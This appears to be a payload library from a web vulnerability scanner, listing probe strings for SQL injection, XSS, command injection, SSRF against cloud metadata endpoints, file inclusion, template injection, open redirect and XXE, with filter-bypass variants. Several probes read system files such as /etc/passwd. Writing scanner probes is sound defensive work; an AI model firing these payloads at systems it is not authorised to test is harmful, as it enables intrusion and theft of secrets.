# scanner/dast/payloads.py
# -----------------------------------------------------------------------------
# CORTEX SENTINEL: COMPREHENSIVE VULNERABILITY PAYLOAD LIBRARY
# -----------------------------------------------------------------------------

# --- SQL INJECTION (SQLi) ---
# Focused on triggering database errors or time-delays
SQLI_PAYLOADS = [
    "'", '"', "\\", "1'",                      # Classic break-strings
    "1' OR '1'='1'--", "1' OR 1=1#",           # Auth bypass / Boolean
    "' UNION SELECT NULL,NULL,NULL--",         # Union discovery
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Time-based (MySQL)
    "1' AND 49=49--",                          # Verification logic
]

# Markers found in HTTP responses that confirm SQLi
SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "unclosed quotation mark after the character string",
    "mysql_fetch_array()",
    "PostgreSQL query failed:",
    "ORA-00933: SQL command not properly ended",
]

# --- CROSS-SITE SCRIPTING (XSS) ---
# Designed for both reflected and DOM-based detection
XSS_PAYLOADS = [
    "<script>alert('SENTINEL_VULN')</script>",
    "\"><script>alert('SENTINEL_VULN')</script>",
    "<img src=x onerror=alert('SENTINEL_VULN')>",
    "javascript:alert('SENTINEL_VULN')",
    "<svg onload=alert('SENTINEL_VULN')>",
]

# --- COMMAND INJECTION (CMDI) ---
# Covers Linux, Windows, and Blind scenarios
CMDI_PAYLOADS = [
    # Linux/Unix Reflected & Blind
    "; echo 'SENTINEL_VULN'; #", 
    "; sleep 5; #",
    "$(sleep 5)",
    # Windows Blind
    "& timeout /t 5 &",
    # Path traversal combined with CMDI
    "; cat /etc/passwd; #",
]

# --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
# Includes WAF bypasses using different IP representations
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",      # AWS/OpenStack Metadata
    "http://169.254.169.254/computeMetadata/v1/",    # GCP Metadata
    "http://0251.0376.0251.0376/",                   # Octal Bypass (169.254...)
    "http://2852039166/",                            # Decimal Bypass (169.254...)
    "http://localhost:80",                           # Internal Port Scan
    "http://[::1]",                                  # IPv6 Loopback
]

# --- LOCAL FILE INCLUSION (LFI) ---
# Targeting sensitive system configuration files
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../windows/win.ini",                  # Windows Target
    "....//....//....//....//etc/passwd",           # Double-filter bypass
    "/proc/self/environ",                           # Log poisoning target
]

# --- SERVER-SIDE TEMPLATE INJECTION (SSTI) ---
# Payloads that yield a predictable mathematical result
SSTI_PAYLOADS = [
    "{{7*7}}",      # Jinja2 / Twig / Smarty (Result: 49)
    "${7*7}",       # Mako / Spring (Result: 49)
    "<%= 7*7 %>",   # ERB / Ruby (Result: 49)
    "#{7*7}",       # Pug (Result: 49)
]

# --- OPEN REDIRECT ---
# Tests if the application redirects to external untrusted domains
OPEN_REDIRECT_PAYLOADS = [
    "https://google.com",
    "//google.com",
    "/\\google.com",
    "/%09/google.com",
]

# --- XML EXTERNAL ENTITY (XXE) ---
# Formatted as raw strings to preserve XML structure
XXE_PAYLOADS = [
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
]